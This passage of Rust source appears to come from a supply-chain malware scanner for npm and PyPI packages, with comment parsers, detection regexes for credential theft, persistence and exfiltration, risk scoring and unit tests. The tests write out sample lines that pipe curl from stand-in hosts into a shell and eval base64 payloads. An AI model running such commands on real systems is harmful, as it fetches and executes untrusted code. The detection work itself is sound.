    fn hash_line(&mut self, line: &str, python: bool) -> bool {
        let bytes = line.as_bytes();
        // A line joined to the one before by a backslash is not a comment line.
        let mut code = (self.quote.is_some() && !self.doc) || self.joined;
        let mut last_sig = 0u8;
        let mut i = 0;
        while i < bytes.len() {
            if let Some((q, triple)) = self.quote {
                match bytes[i] {
                    b'\\' if q == b'"' || python => i += 2,
                    b if b == q => {
                        if triple {
                            if bytes[i..].starts_with(&[q, q, q]) {
                                self.quote = None;
                                self.doc = false;
                                i += 3;
                            } else {
                                i += 1;
                            }
                        } else {
                            self.quote = None;
                            i += 1;
                        }
                    }
                    _ => i += 1,
                }
                continue;
            }
            match bytes[i] {
                b' ' | b'\t' | b'\r' | 0x0c => i += 1,
                b'#' if python || i == 0 || matches!(bytes[i - 1], b' ' | b'\t' | b';') => break,
                b'\\' => {
                    code = true;
                    i += 2;
                }
                q @ (b'"' | b'\'') => {
                    let triple = python && bytes[i..].starts_with(&[q, q, q]);
                    // A triple-quoted string that starts a statement is a docstring.
                    // Only the first statement of the file or one right after a line
                    // ending in `:` is: anything else may be a string the code uses.
                    self.doc = triple
                        && !code
                        && self.depth == 0
                        && !self.no_doc
                        && (!self.seen_code || self.last_colon);
                    if self.doc {
                        self.seen_code = true;
                        self.last_colon = false;
                    } else {
                        code = true;
                        last_sig = q;
                    }
                    self.quote = Some((q, triple));
                    i += if triple { 3 } else { 1 };
                }
                b => {
                    code = true;
                    last_sig = b;
                    match b {
                        b'(' | b'[' | b'{' => self.depth += 1,
                        b')' | b']' | b'}' => self.depth = self.depth.saturating_sub(1),
                        _ => {}
                    }
                    i += 1;
                }
            }
        }
        if code {
            self.seen_code = true;
            self.last_colon = last_sig == b':';
        }
        let continued = ends_with_backslash(bytes);
        // A Python string ends with its line unless the line is continued.
        if python && !continued && matches!(self.quote, Some((_, false))) {
            self.quote = None;
        }
        self.joined = continued && self.quote.is_none();
        !code
    }

    fn js_line(&mut self, line: &str) -> bool {
        let bytes = line.as_bytes();
        let mut code = self.uncertain || matches!(self.templates.last(), Some(None));
        let mut i = 0;
        if let Some(q) = self.string_cont.take() {
            // The rest of a string continued from the line before.
            code = true;
            match string_end_on_line(bytes, 0, q) {
                Some(end) => {
                    i = end;
                    self.prev = b'a';
                }
                None => {
                    if ends_with_backslash(bytes) {
                        self.string_cont = Some(q);
                    }
                    return false;
                }
            }
        }
        while i < bytes.len() {
            if self.in_block {
                if let Some(at) = line[i..].find("*/") {
                    i += at + 2;
                    self.in_block = false;
                    self.block_lines = 0;
                    continue;
                }
                self.block_lines += 1;
                if self.block_untrusted {
                    code = true;
                }
                // Past the cap the text counts as code, but the block stays open.
                if self.block_lines > MAX_BLOCK_COMMENT_LINES {
                    code = true;
                }
                return !code;
            }
            if matches!(self.templates.last(), Some(None)) {
                code = true;
                match bytes[i] {
                    b'\\' => i += 2,
                    b'`' => {
                        self.templates.pop();
                        self.prev = b'`';
                        i += 1;
                    }
                    b'$' if bytes.get(i + 1) == Some(&b'{') => {
                        if let Some(top) = self.templates.last_mut() {
                            *top = Some(0);
                        }
                        self.prev = b'(';
                        i += 2;
                    }
                    _ => i += 1,
                }
                continue;
            }
            let c = bytes[i];
            match c {
                b' ' | b'\t' | b'\r' => i += 1,
                b'/' if bytes.get(i + 1) == Some(&b'*') => {
                    self.block_untrusted = code;
                    self.in_block = true;
                    self.block_lines = 0;
                    i += 2;
                }
                b'/' if bytes.get(i + 1) == Some(&b'/') => break,
                b'/' if matches!(
                    self.prev,
                    b'(' | b','
                        | b'='
                        | b':'
                        | b'['
                        | b'!'
                        | b'&'
                        | b'|'
                        | b'?'
                        | b'{'
                        | b'}'
                        | b';'
                        | b'+'
                        | b'-'
                        | b'*'
                        | b'%'
                        | b'<'
                        | b'>'
                        | b'~'
                        | b'^'
                ) =>
                {
                    // A regular expression literal: skip to its closing slash.
                    code = true;
                    let open = i;
                    i += 1;
                    let mut class = false;
                    let mut closed = false;
                    while i < bytes.len() {
                        match bytes[i] {
                            b'\\' => i += 1,
                            b'[' => class = true,
                            b']' => class = false,
                            b'/' if !class => {
                                i += 1;
                                closed = true;
                                break;
                            }
                            _ => {}
                        }
                        i += 1;
                    }
                    if closed {
                        // After `}` or a sign the slash may be a division
                        // (`a++ / 2`) and the "regex" a span of code.
                        if matches!(self.prev, b'}' | b'+' | b'-') {
                            self.uncertain = true;
                        }
                        self.prev = b'a';
                    } else {
                        // A regex does not span lines: this was a division. Read
                        // the rest of the line again as code, and trust no later
                        // comment.
                        self.uncertain = true;
                        i = open + 1;
                        self.prev = b'/';
                    }
                }
                b'"' | b'\'' => {
                    code = true;
                    i += 1;
                    while i < bytes.len() && bytes[i] != c {
                        i += if bytes[i] == b'\\' { 2 } else { 1 };
                    }
                    if i >= bytes.len() {
                        if ends_with_backslash(bytes) {
                            self.string_cont = Some(c);
                        } else {
                            // Not closed on its line: a syntax error, or a quote
                            // that was not one. Either way nothing after is trusted.
                            self.uncertain = true;
                        }
                    }
                    i += 1;
                    self.prev = b'a';
                }
                b'`' => {
                    code = true;
                    self.templates.push(None);
                    i += 1;
                }
                b'{' | b'}' => {
                    code = true;
                    match (c, self.templates.last_mut()) {
                        (b'{', Some(Some(depth))) => *depth += 1,
                        (b'}', Some(Some(0))) => {
                            // The end of `${ ... }`: back to the literal's text.
                            if let Some(top) = self.templates.last_mut() {
                                *top = None;
                            }
                        }
                        (b'}', Some(Some(depth))) => *depth -= 1,
                        _ => {}
                    }
                    self.prev = c;
                    i += 1;
                }
                _ => {
                    code = true;
                    // A division after `)`, `]`, an identifier or a number is a
                    // guess; with a slash, quote or backtick after it the pair
                    // could be read the other way round.
                    if c == b'/'
                        && bytes[i + 1..]
                            .iter()
                            .any(|b| matches!(b, b'/' | b'\'' | b'"' | b'`'))
                    {
                        self.uncertain = true;
                    }
                    self.prev = c;
                    i += 1;
                }
            }
        }
        !code
    }
}

/// True when the line ends in an odd number of backslashes (a continuation).
fn ends_with_backslash(bytes: &[u8]) -> bool {
    let mut end = bytes.len();
    while end > 0 && bytes[end - 1] == b'\r' {
        end -= 1;
    }
    bytes[..end]
        .iter()
        .rev()
        .take_while(|&&b| b == b'\\')
        .count()
        % 2
        == 1
}

/// Index just past the closing `quote` of a single-line Python string whose
/// body starts at `from`, or `None` when the line ends first.
fn string_end_on_line(bytes: &[u8], from: usize, quote: u8) -> Option<usize> {
    let mut i = from;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => i += 2,
            b if b == quote => return Some(i + 1),
            _ => i += 1,
        }
    }
    None
}

/// `.d.ts`, `.d.mts` and `.d.cts` files.
fn is_declaration_file(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.ends_with(".d.ts") || lower.ends_with(".d.mts") || lower.ends_with(".d.cts")
}

fn write_context_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(>>?\s*[~$\w/."']|writeFile|appendFile|createWriteStream|\bopen\(|\becho\b|\btee\b|\bcp\b|\bln\s+-s|\bsed\s+-i|\.write\(|write_text|\bcrontab\b|\bsystemctl\b|\bschtasks\b|launchctl)"#,
        )
        .expect("write context regex")
    })
}

fn access_context_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(readFile|createReadStream|\bopen\(|read_text|read_bytes|\bcat\s|\bcp\s|\bscp\s|\btar\s|\bzip\b|\bcurl\b|\bwget\b|homedir|expanduser|\$HOME|~/|path\.join|os\.path\.join|\bPath\(|copyFile|shutil\.)",
        )
        .expect("access context regex")
    })
}

/// Second look at a rule match. Names that only appear in a lookup table (a
/// lexer's file-name list) or an environment read that is only `NODE_ENV` are
/// not what the rule is about.
fn match_is_credible(rule: &Rule, line: &str, matched: &str) -> bool {
    match rule.category {
        "persistence" => write_context_regex().is_match(line),
        "credential-theft" if rule.severity == "High" => access_context_regex().is_match(line),
        "exfiltration" if rule.name == "Environment sent over the network" => {
            let stripped = matched
                .replace("process.env.NODE_ENV", "")
                .replace("process.env.NODE_DEBUG", "")
                .replace("process.env.DEBUG", "")
                .replace("process.env.NODE_PATH", "");
            stripped.contains("process.env")
                || stripped.contains("environ")
                || stripped.contains("getenv")
        }
        _ => true,
    }
}

/// Regexes for the whole-file checks of one language.
struct FlowRegexes {
    /// A network fetch.
    fetch: Regex,
    /// Something is written to disk.
    write: Regex,
    /// A child process is started with a variable or built-up command.
    exec: Regex,
    /// Any child process start (judged only in `setup.py`).
    exec_loose: Regex,
    /// Code is evaluated from a variable.
    eval: Regex,
    /// A request body is sent, not only a URL fetched.
    send: Regex,
    /// The whole environment is put in a value (not one variable read).
    env_whole: Regex,
    /// The line also builds a payload or message from it.
    env_sink: Regex,
    /// The environment is handed to a child process (`env=os.environ`).
    env_child: Regex,
}

fn flow_regexes(lang: Lang) -> &'static FlowRegexes {
    static JS_FLOW: OnceLock<FlowRegexes> = OnceLock::new();
    static PY_FLOW: OnceLock<FlowRegexes> = OnceLock::new();
    let build = |fetch: &str,
                 write: &str,
                 exec: &str,
                 exec_loose: &str,
                 eval: &str,
                 send: &str,
                 env_whole: &str,
                 env_sink: &str,
                 env_child: &str| FlowRegexes {
        fetch: Regex::new(fetch).expect("flow regex"),
        write: Regex::new(write).expect("flow regex"),
        exec: Regex::new(exec).expect("flow regex"),
        exec_loose: Regex::new(exec_loose).expect("flow regex"),
        eval: Regex::new(eval).expect("flow regex"),
        send: Regex::new(send).expect("flow regex"),
        env_whole: Regex::new(env_whole).expect("flow regex"),
        env_sink: Regex::new(env_sink).expect("flow regex"),
        env_child: Regex::new(env_child).expect("flow regex"),
    };
    if lang == Lang::Python {
        PY_FLOW.get_or_init(|| {
            build(
                r"(\burlretrieve\(|\burlopen\(|\brequests\.(get|post|put|request)\(|\bhttpx\.\w+\(|\bhttp\.client\b|\burllib3\b|\bwget\.download\(|\burllib\.request\.\w+\()",
                r#"(\burlretrieve\(\s*[^,)]+,|\bopen\([^)]*,\s*['"][wa][b+]*['"]|\.write_bytes\(|\.write_text\(|\bcopyfileobj\(|\bwget\.download\()"#,
                r#"((subprocess\.\w+|os\.(system|popen|exec\w+|spawn\w+)|pty\.spawn)\s*\(\s*(\[\s*)?([A-Za-z_][\w.]*\s*[,)\]]|f['"]|[^)\n]*(\+|%\s|\.format\()))"#,
                r"((subprocess\.\w+|os\.(system|popen|exec\w+|spawn\w+)|pty\.spawn)\s*\()",
                r"((^|[^.\w])(exec|eval)\s*\([^\n]*(\.text\b|\.content\b|\.read\(\)))",
                r"(\brequests\.(post|put|patch)\(|\bhttpx\.(post|put|patch)\(|[(,]\s*(data|json|files)\s*=|\.sendall?\(|\bsmtplib\b|\bftplib\b|\burlopen\([^)]*,)",
                r"(os\.environ(\s*[,)\]}]|\s*$)|dict\(os\.environ\)|os\.environ\.(copy|items)\(\))",
                r"(json|data|dumps|post|b64|base64|encode)",
                r"(\benv\s*=|\bstr\()",
            )
        })
    } else {
        JS_FLOW.get_or_init(|| {
            build(
                r#"(\b(https?|http2)\s*\.\s*(get|request)\s*\(|['"]\)\s*\.\s*(get|request)\s*\(|(^|[^.\w$])fetch\s*\(|\baxios\b|\bgot\s*[.(]|\bnode-fetch\b|\bsuperagent\b|\bneedle\s*[.(])"#,
                r"\b(writeFile(Sync)?|appendFile(Sync)?|createWriteStream|copyFile(Sync)?)\s*\(",
                r"((^|[^.\w$])(exec|execSync|execFile|execFileSync|spawn|spawnSync|fork)|\b(child_process|childProcess|cp)\s*\.\s*(exec|execSync|execFile|execFileSync|spawn|spawnSync|fork))\s*\(\s*([A-Za-z_$][\w$.]*\s*[,)]|[^)\n]*(\+|\$\{))",
                r"(^|[^.\w$])(exec|execSync|execFile|execFileSync|spawn|spawnSync)\s*\(",
                r"((^|[^.\w$])(eval\s*\(|new\s+Function\s*\()\s*[A-Za-z_$]|\bvm\.run\w+\s*\(\s*[A-Za-z_$])",
                r#"(\.(post|put|patch)\s*\(|method\s*:\s*['"](POST|PUT|PATCH)['"]|\breq(uest)?\.(write|end)\s*\(\s*[^)\s]|\.send\s*\(|\bbody\s*:|\bform\s*:)"#,
                r"process\.env(\s*[,})\]]|\s*$)",
                r"(JSON\.stringify|base64|btoa|\.write\(|\.send\(|body\s*:|data\s*:|querystring|Object\.entries)",
                r"(\benv\s*:|\bObject\.assign\b|\bspawn\w*\(|\bexec\w*\()",
            )
        })
    }
}

/// Checks that need the whole file: a download that is written to disk and run,
/// or passed to code evaluation, and a credential file or the environment that
/// reaches a network send. One rule per line cannot see these; the Node and
/// Python APIs spread them over several statements.
fn correlate_file(
    lang: Lang,
    is_setup: bool,
    path: &str,
    code: &[(usize, &str)],
    credential_read: Option<(usize, &str)>,
    scan: &mut FileScan,
    per_rule: &mut HashMap<&'static str, usize>,
) {
    let flow = flow_regexes(lang);
    // Ordinary network code, build tools and bundles hold a fetch, a file write
    // and a child process far apart. Only statements that are close together, in
    // the order of an attack, count; a line too long to be hand-written (a
    // minified bundle) is not judged here.
    let code: Vec<(usize, &str)> = code
        .iter()
        .filter(|(_, line)| line.len() <= FLOW_MAX_LINE)
        .copied()
        .collect();
    let code = &code[..];
    let near = |a: usize, b: usize| a.abs_diff(b) <= FLOW_WINDOW;
    if !code.iter().any(|(_, l)| flow.fetch.is_match(l)) {
        return;
    }
    // The first line matching `re` that is at or after `from` and within the window.
    let after = |re: &Regex, from: usize| {
        code.iter()
            .find(|(n, line)| *n >= from && near(*n, from) && re.is_match(line))
            .copied()
    };
    // Every fetch is a possible start of the chain.
    let fetches: Vec<usize> = code
        .iter()
        .filter(|(_, l)| flow.fetch.is_match(l))
        .map(|(n, _)| *n)
        .take(200)
        .collect();
    // `child_process` must be in the file for a JavaScript exec, or a regular
    // expression's `.exec(` would count.
    let uses_child_process =
        lang != Lang::Js || code.iter().any(|(_, l)| l.contains("child_process"));
    let mut add =
        |rule: &'static str, category: &'static str, line: usize, text: &str, note: String| {
            if scan.findings.iter().any(|f| f.rule == rule) {
                return;
            }
            let shown = format!("{} ({note})", text.trim());
            push_finding(
                scan,
                per_rule,
                rule,
                category,
                "High",
                path,
                line,
                &shown,
                0,
                shown.len(),
                false,
            );
        };

    for &f in &fetches {
        let exec_re_hit = |from: usize| {
            if !uses_child_process {
                return None;
            }
            after(&flow.exec, from).or_else(|| {
                (lang == Lang::Python && is_setup)
                    .then(|| after(&flow.exec_loose, from))
                    .flatten()
            })
        };
        let Some((write_line, _)) = after(&flow.write, f) else {
            continue;
        };
        if let Some((exec_line, exec_text)) = exec_re_hit(write_line) {
            add(
                "Download written to disk and run",
                "download-exec",
                exec_line,
                exec_text,
                format!("downloaded at line {f}, written at line {write_line}"),
            );
            break;
        }
    }
    for &f in &fetches {
        if let Some((eval_line, eval_text)) = after(&flow.eval, f) {
            add(
                "Download passed to code evaluation",
                "download-exec",
                eval_line,
                eval_text,
                format!("downloaded at line {f}"),
            );
            break;
        }
    }
    if let Some((cred_line, cred_text)) = credential_read {
        if let Some((send_line, _)) = code
            .iter()
            .find(|(n, l)| near(*n, cred_line) && flow.send.is_match(l))
            .copied()
        {
            add(
                "Credential file sent over the network",
                "exfiltration",
                cred_line,
                cred_text,
                format!("request body built at line {send_line}"),
            );
        }
    }
    // The environment must be in the value that is sent (a line that builds
    // it), close to the send; handing it to a child process is not a send.
    let env = code.iter().find(|(n, line)| {
        flow.env_whole.is_match(line)
            && flow.env_sink.is_match(line)
            && !flow.env_child.is_match(line)
            && code
                .iter()
                .any(|(m, l)| m.abs_diff(*n) <= FLOW_ENV_WINDOW && flow.send.is_match(l))
    });
    if let Some((env_line, env_text)) = env.copied() {
        let send_line = code
            .iter()
            .filter(|(m, l)| m.abs_diff(env_line) <= FLOW_ENV_WINDOW && flow.send.is_match(l))
            .map(|(m, _)| *m)
            .next()
            .unwrap_or(env_line);
        add(
            "Environment sent over the network",
            "exfiltration",
            env_line,
            env_text,
            format!("request body built at line {send_line}"),
        );
    }
}

fn setup_network_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(urlopen|urlretrieve|requests\.(get|post)|\bwget\b|\bcurl\b)").expect("regex")
    })
}

#[allow(clippy::too_many_arguments)]
fn push_finding(
    scan: &mut FileScan,
    per_rule: &mut HashMap<&'static str, usize>,
    rule: &'static str,
    category: &'static str,
    severity: &'static str,
    path: &str,
    line_number: usize,
    line: &str,
    start: usize,
    end: usize,
    in_comment: bool,
) {
    if scan.findings.len() >= MAX_PER_FILE {
        return;
    }
    let seen = per_rule.entry(rule).or_insert(0);
    if *seen >= MAX_PER_RULE_PER_FILE {
        return;
    }
    *seen += 1;
    scan.findings.push(SourceFinding {
        rule: rule.to_string(),
        category: category.to_string(),
        severity: severity.to_string(),
        file: path.to_string(),
        line: line_number,
        evidence: evidence_window(line, start, end),
        in_comment,
    });
}

/// Edit distance between two names: insertions, deletions, substitutions and
/// transposition of adjacent characters each cost 1.
pub fn edit_distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    // Three rolling rows (the transposition looks two rows back).
    let mut older = vec![0usize; b.len() + 1];
    let mut previous: Vec<usize> = (0..=b.len()).collect();
    let mut current = vec![0usize; b.len() + 1];
    for i in 1..=a.len() {
        current[0] = i;
        for j in 1..=b.len() {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            let mut best = (previous[j] + 1)
                .min(current[j - 1] + 1)
                .min(previous[j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                best = best.min(older[j - 2] + 1);
            }
            current[j] = best;
        }
        std::mem::swap(&mut older, &mut previous);
        std::mem::swap(&mut previous, &mut current);
    }
    previous[b.len()]
}

/// Order of severities, higher is worse.
pub fn severity_rank(severity: &str) -> u8 {
    match severity {
        "Critical" => 4,
        "High" => 3,
        "Medium" => 2,
        "Low" => 1,
        _ => 0,
    }
}

/// Risk points the source findings add to a package's score (at most 80).
pub fn source_findings_score(findings: &[SourceFinding]) -> f32 {
    let worst = findings
        .iter()
        .map(|f| severity_rank(&f.severity))
        .max()
        .unwrap_or(0);
    let mut score = 0.0f32;
    if worst >= 4 {
        score += 40.0;
    }
    if findings.iter().any(|f| severity_rank(&f.severity) == 3)
        || (worst >= 4 && findings.iter().filter(|f| f.severity == "Critical").count() > 1)
    {
        score += 25.0;
    }
    if findings.iter().any(|f| f.severity == "Medium") {
        score += 8.0;
    }
    // Several independent kinds of behaviour are worse than one repeated.
    let categories: HashSet<&str> = findings
        .iter()
        .filter(|f| severity_rank(&f.severity) >= 3)
        .map(|f| f.category.as_str())
        .collect();
    score += 5.0 * (categories.len().saturating_sub(1).min(3) as f32);
    // A High finding that is a download-and-run, a credential read or an
    // exfiltration endpoint is the payload of an attack, not a style problem:
    // it alone puts the package at High, wherever in the package it sits.
    if findings.iter().any(|f| {
        severity_rank(&f.severity) >= 3
            && !f.in_comment
            && matches!(
                f.category.as_str(),
                "download-exec" | "credential-theft" | "exfiltration" | "backdoor" | "unsafe-path"
            )
    }) {
        score = score.max(60.0);
    }
    score.min(80.0)
}

/// Counts of findings by severity.
pub fn count_by_severity(findings: &[SourceFinding]) -> serde_json::Value {
    let mut counts = [0usize; 4];
    for finding in findings {
        match finding.severity.as_str() {
            "Critical" => counts[0] += 1,
            "High" => counts[1] += 1,
            "Medium" => counts[2] += 1,
            _ => counts[3] += 1,
        }
    }
    serde_json::json!({
        "critical": counts[0], "high": counts[1], "medium": counts[2], "low": counts[3]
    })
}

/// Sort findings worst first, then by file and line.
pub fn sort_findings(findings: &mut [SourceFinding]) {
    findings.sort_by(|a, b| {
        severity_rank(&b.severity)
            .cmp(&severity_rank(&a.severity))
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
    });
}

/// Heuristic: the argument looks like a registry package name or `name@version`
/// rather than a path, and no such path exists.
pub fn looks_like_registry_spec(raw: &str) -> bool {
    let raw = raw.trim();
    if raw.is_empty()
        || raw.starts_with('/')
        || raw.starts_with('.')
        || raw.starts_with('~')
        || raw.contains('\\')
        || raw.contains(' ')
        || raw.contains("://")
    {
        return false;
    }
    let slashes = raw.matches('/').count();
    // `express`, `lodash@4.17.4`, `requests==2.5.0`, `@scope/name`, `@scope/name@1.2.3`.
    if raw.starts_with('@') {
        return slashes == 1;
    }
    slashes == 0 && !raw.contains(':')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn registry_specs_are_recognised() {
        for spec in [
            "express",
            "lodash@4.17.4",
            "@scope/name",
            "requests==2.5.0",
            "Django",
        ] {
            assert!(looks_like_registry_spec(spec), "{spec}");
        }
        for spec in ["/tmp/x.tgz", "./x", "~/x", "dir/x.tgz", "C:\\x", ""] {
            assert!(!looks_like_registry_spec(spec), "{spec}");
        }
    }

    #[test]
    fn js_rules_report_file_line_and_evidence() {
        let src = "const a = 1;\nrequire('child_process').exec('curl http://example.invalid/p.sh | sh');\neval(Buffer.from('AAAA','base64').toString());\n";
        let scan = scan_source(Lang::Js, "index.js", src.as_bytes());
        let rules: Vec<(&str, usize)> = scan
            .findings
            .iter()
            .map(|f| (f.rule.as_str(), f.line))
            .collect();
        assert!(rules.contains(&("Download piped to a shell or interpreter", 2)));
        assert!(rules.contains(&("Process execution module", 2)));
        assert!(rules.contains(&("Eval of decoded payload", 3)));
        assert!(scan.findings.iter().all(|f| f.file == "index.js"));
    }

    #[test]
    fn python_rules_and_imports() {
        let src = "import os, subprocess\nfrom base64 import b64decode\nexec(base64.b64decode('AAAA'))\nsubprocess.call('curl http://x.invalid | sh', shell=True)\n";
        let scan = scan_source(Lang::Python, "pkg/mod.py", src.as_bytes());
        assert!(scan
            .findings
            .iter()
            .any(|f| f.rule == "Exec of decoded payload" && f.line == 3));
        assert!(scan
            .findings
            .iter()
            .any(|f| f.severity == "Critical" && f.line == 4));
        assert!(scan.imports.contains(&"subprocess".to_string()));
    }

    #[test]
    fn benign_code_is_quiet() {
        let src = "const re = /a(b)/;\nconst m = re.exec('ab');\nmodule.exports = function sum(a, b) { return a + b; };\n";
        assert!(scan_source(Lang::Js, "i.js", src.as_bytes())
            .findings
            .is_empty());
    }

    #[test]
    fn metadata_entries_are_recognised() {
        assert!(is_metadata_entry("package/._package.json"));
        assert!(!is_metadata_entry("pax_global_header"));
        assert!(is_metadata_entry("__MACOSX/x/y"));
        assert!(!is_metadata_entry("package/package.json"));
    }
}

#[cfg(test)]
mod tar_budget_tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn zero_blocks_past_the_stream_budget_stop_the_walk_and_say_so() {
        let dir = std::env::temp_dir().join(format!("fs-zero-budget-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("z.tar");
        let mut builder = tar::Builder::new(Vec::new());
        let mut h = tar::Header::new_ustar();
        h.set_path("a.txt").unwrap();
        h.set_size(2);
        h.set_cksum();
        builder.append(&h, &b"hi"[..]).unwrap();
        let mut bytes = builder.into_inner().unwrap();
        bytes.extend(vec![0u8; 8 * 1024 * 1024]);
        let mut h = tar::Header::new_ustar();
        h.set_path("evil.js").unwrap();
        h.set_size(2);
        h.set_cksum();
        bytes.extend_from_slice(h.as_bytes());
        bytes.extend_from_slice(b"hi");
        bytes.extend(vec![0u8; 510]);
        bytes.extend(vec![0u8; 1024]);
        std::fs::File::create(&path)
            .unwrap()
            .write_all(&bytes)
            .unwrap();
        let mut seen = Vec::new();
        let (_, cut) = walk_tar_budget(&path, ContainerKind::Tar, 1024 * 1024, &mut |item| {
            seen.push(item.path);
            Ok(true)
        })
        .unwrap();
        assert!(cut);
        assert_eq!(seen, ["a.txt"]);
        // Within the budget everything is read and nothing is reported cut.
        let mut seen = Vec::new();
        let (_, cut) = walk_tar_budget(&path, ContainerKind::Tar, 64 * 1024 * 1024, &mut |item| {
            seen.push(item.path);
            Ok(true)
        })
        .unwrap();
        assert!(!cut);
        assert_eq!(seen, ["a.txt", "evil.js"]);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
